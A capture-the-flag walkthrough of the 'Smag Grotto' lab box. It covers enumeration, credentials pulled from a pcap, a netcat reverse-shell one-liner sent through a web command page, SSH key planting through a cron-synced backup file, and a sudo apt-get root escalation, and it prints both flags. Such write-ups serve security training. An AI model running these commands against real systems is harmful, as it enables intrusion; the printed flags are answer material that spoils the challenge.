# Smag Grotto

nmap scan 

```abap
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

Going in to the first website we see this message 

```abap
Welcome to Smag!

This site is still heavily under development, check back soon to see some of the awesome services we offer!
```

Running a dirsearch gives us 

```abap
[02:29:40] 301 -  303B  - /mail  ->  http://smag.thm/mail/
[02:29:40] 200 -  907B  - /mail/
```

Going to `/mail`  we get this hint 

```abap
The following emails are being displayed using our new and improved email2web software, allowing you to view your emails in a hassle free way!

Note: all attachments must be downloaded with wget.
```

Looking around there is also a link that downlaods a pcap file. Opening that file and right clicking the HTTP source we then Follow > TCP Stream. we get a username and password

```abap
username=helpdesk&password=cH4nG3M3_n0w
```

Now where to input these credentials. Lets go back to enumerating

```abap
gobuster vhost -u http://smag.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

We have found the subdomain called `development.smag.thm` Dont forget to add that to the `/etc/hosts`Now we have a login page so we should now use the credentials above.

<img width="1856" height="971" alt="Screenshot From 2025-09-09 21-59-47" src="https://github.com/user-attachments/assets/a624e940-cde2-4e27-81e2-d582f9e7e699" />


After logging in we get a page where we can enter commands. Many commands can work but what can possibly work is a reverse shell.

```abap
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP> <PORT> >/tmp/f
```

Set up a listener and then click send and you should be in!

So we dont have any access to much but looking around we see that theres jakes private key at `/opt/.backups/jake_id_rsa.pub.backup` we can change the private key to a public key 

```abap
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC5HGAnm2nNgzDW9OPAZ9dP0tZbvNrIJWa/swbWX1dogZPCFYn8Ys3P7oNPyzXS6ku72pviGs5kQsxNWpPY94bt2zvd1J6tBw5g64ox3BhCG4cUvuI5zEi7y+xnIiTs5/MoF/gjQ2IdNDdvMs/hDj4wc2x8TFLPlCmR1b/uHydkuvdtw9WzZN1O+Ax3yEkMfB8fO3F7UqN2798wBPpRNNysQ+59zIUbV9kJpvARBILjIupikOsTs8FMMp2Um6aSpFKWzt15na0vou0riNXDTgt6WtPYxmtv1AHE4VdD6xFJrM5CGffGbYEQjvJoFX2+vSOCDEFZw1SjuajykOaEOfheuY96Ao3f41m2Sn7Y9XiDt1UP4/Ws+kxfpX2mN69+jsPYmIKY72MSSm27nWG3jRgvPZsFgFyE00ZTP5dtrmoNf0CbzQBriJUa596XEsSOMmcjgoVgQUIr+WYNGWXgpH8G+ipFP/5whaJiqPIfPfvEHbT4m5ZsSaXuDmKercFeRDs= kali@kali
```

### Step 1 — Discovery

While enumerating the target, we noticed that Jake’s SSH public key (`~/.ssh/authorized_keys`) is being populated from a backup file:

```
/opt/.backups/jake_id_rsa.pub.backup
```

This backup is periodically copied into Jake’s `authorized_keys` by a cron or sync job.

👉 This gives us a privilege escalation opportunity: if we can overwrite the backup file with **our own public key**, the system will trust our private key to log in as Jake.

---

### Step 2 — Generate SSH Keys (Attack Box)

On the **Attack Box (Kali)**, we generated a new RSA keypair:

```bash
ssh-keygen -t rsa -b 2048 -f id_rsa
```

This created:

- `id_rsa` → our **private key** (kept locally, used for authentication).
- `id_rsa.pub` → our **public key** (safe to copy to the target).

---

### Step 3 — Replace Jake’s Backup Public Key (Target)

On the **Target (the shell we already had)**, we overwrote the backup public key file with our own public key:

```bash
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLPwStAKQciIL/y4uWMFh0OCEKQ4Lej8p4RuYpUR+vv3A+VzFyUkoygum26DqIUZtYmtmOpzdFhunMiy0chDbhWGFMScgfup4cMQLYRbUA9P31xgDQ4ZA3eV06Z6vBlpeLCcGdb4cezySh1Ez96kSr9S9RhfD2VAVKbECr7LNoHpFkvmjFWI03SxeoQvk2ITx6vGabhb5UzNNYiDEAX38A7UvVzFisK66YBHlfwGgMe8P60Up7yVI+hRhKyqvdflnmE13R17mWyQAqMntBv8LSTuD+zAVtpN+faMxD/JjBaAmGdr08j/kRzIVtDDe5Blt4YWCMvsIzmWpp4GcFnnw/ root@ip-10-201-48-170" > /opt/.backups/jake_id_rsa.pub.backup
```

This ensured that the backup now contained our attacker public key.

---

### Step 4 — Cron Sync Updates Jake’s Authorized Keys (Target)

We waited for the scheduled job to run. After a short delay, Jake’s `authorized_keys` was updated:

```bash
cat /home/jake/.ssh/authorized_keys
```

Output showed our public key, confirming that the system now trusts our key.

---

## Step 5 — SSH into Jake’s Account (Attack Box)

Back on the **Attack Box**, we used our private key to log in as Jake via SSH:

```bash
ssh -i id_rsa jake@smag.thm
```

Now that we are in as Jake we have the first flag

> iusGorV7EbmxM5AuIe2w499msaSuqU3j
> 

In order to get root we can do 

```abap
jake@smag:~$ sudo -l
Matching Defaults entries for jake on smag:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
```

https://gtfobins.github.io/gtfobins/apt-get/

Try this one liner command 

```abap
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

Then we are in root

Flag 2

> uJr6zRgetaniyHVRqqL58uRasybBKz2T
>
